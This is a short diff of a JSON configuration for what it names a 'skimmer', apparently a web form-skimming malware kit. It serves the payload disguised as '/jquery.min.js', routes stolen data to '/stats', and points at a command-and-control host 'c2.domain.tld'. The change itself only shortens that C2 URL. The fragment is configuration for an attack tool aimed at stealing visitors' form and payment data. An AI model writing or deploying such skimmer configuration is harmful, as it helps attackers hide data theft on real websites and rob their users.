@@ -11,7 +11,7 @@
     "skimmer": {
         "payload_route": "/jquery.min.js",
         "data_route": "/stats",
-        "url": "http://c2.domain.tld/stats?key=",
+        "url": "http://c2.domain.tld",
         "target_classes": [],
         "target_ids": []
     },    
